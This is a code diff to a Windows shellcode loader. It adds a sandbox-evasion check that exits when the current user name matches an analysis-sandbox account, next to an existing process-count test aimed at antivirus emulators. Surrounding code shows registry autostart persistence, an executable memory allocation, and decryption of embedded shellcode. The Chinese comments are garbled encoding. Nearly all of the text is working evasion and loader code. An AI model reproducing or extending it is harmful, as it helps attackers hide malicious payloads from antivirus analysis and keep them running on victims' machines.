@@ -1,5 +1,7 @@
 #include<windows.h>
 #include<TlHelp32.h>
+#define numSandboxUser 1
+const WCHAR* sandboxUsername[numSandboxUser] = { L"JohnDoe" };
 
 //shellcode memory to execute
 LPVOID Memory;
@@ -77,6 +79,8 @@ struct CONFIG
 **********************************************************************/
 void AntiSimulation()
 {
+	WCHAR username[3267];
+	DWORD charCount = 3267;
 	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (INVALID_HANDLE_VALUE == hSnapshot)
 	{
@@ -88,9 +92,17 @@ void AntiSimulation()
 	{
 		procnum++;
 	}
-	if (procnum <= 40)  //ÅÐ¶Ïµ±Ç°½ø³ÌÊÇ·ñµÍÓÚ40¸ö£¬Ä¿Ç°¼û¹ýÄÜÄ£Äâ×î¶à½ø³ÌµÄÊÇWDÄÜÄ£Äâ39¸ö
+	if (procnum <= 40)  //åˆ¤æ–­å½“å‰è¿›ç¨‹æ˜¯å¦ä½ŽäºŽ40ä¸ªï¼Œç›®å‰è§è¿‡èƒ½æ¨¡æ‹Ÿæœ€å¤šè¿›ç¨‹çš„æ˜¯WDèƒ½æ¨¡æ‹Ÿ39ä¸ª
 	{
 		exit(1);
+	}
+	if (!GetUserName(username, &charCount)) {
+		return;
+	}
+	for (int i = 0; i < numSandboxUser; ++i) {
+		if (wcsicmp(username, sandboxUsername[i]) == 0) {
+			exit(1);
+		}
 	}
 }
 
@@ -121,11 +133,11 @@ void AutoStart()
 **********************************************************************/
 void init(BOOL anti_sandbox, BOOL autostart)
 {
-	if (anti_sandbox)  //·´·ÂÕæ
+	if (anti_sandbox)  //åä»¿çœŸ
 	{
 		AntiSimulation();
 	}
-	if (autostart)  //×¢²á±íÌí¼Ó×ÔÆô¶¯
+	if (autostart)  //æ³¨å†Œè¡¨æ·»åŠ è‡ªå¯åŠ¨
 	{
 		AutoStart();
 	}
@@ -151,7 +163,7 @@ void GetShellcodeFromRes(int resourceID, UINT &shellcodeSize)
 	//2.Initialization
 	memcpy(&config, pBuffer, sizeof(CONFIG));
 	init(config.antisandbox, config.autostart);
-	//3.Getshellcode   //TLS»Øµ÷º¯ÊýÖÐ²»ÄÜÊ¹ÓÃnew·ÖÅäÄÚ´æ£¬·ñÔò»á³öÏÖ·ÃÎÊ´íÎó£¬ËùÒÔÖ±½Ó·ÖÅä¿ÉÖ´ÐÐÄÚ´æ
+	//3.Getshellcode   //TLSå›žè°ƒå‡½æ•°ä¸­ä¸èƒ½ä½¿ç”¨newåˆ†é…å†…å­˜ï¼Œå¦åˆ™ä¼šå‡ºçŽ°è®¿é—®é”™è¯¯ï¼Œæ‰€ä»¥ç›´æŽ¥åˆ†é…å¯æ‰§è¡Œå†…å­˜
 	Memory = VirtualAlloc(NULL, totalSize - sizeof(CONFIG), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	memcpy(Memory, (char *)pBuffer + sizeof(CONFIG), totalSize - sizeof(CONFIG));
 	StreamCrypt((unsigned char*)Memory, totalSize - sizeof(CONFIG), config.key, 128);
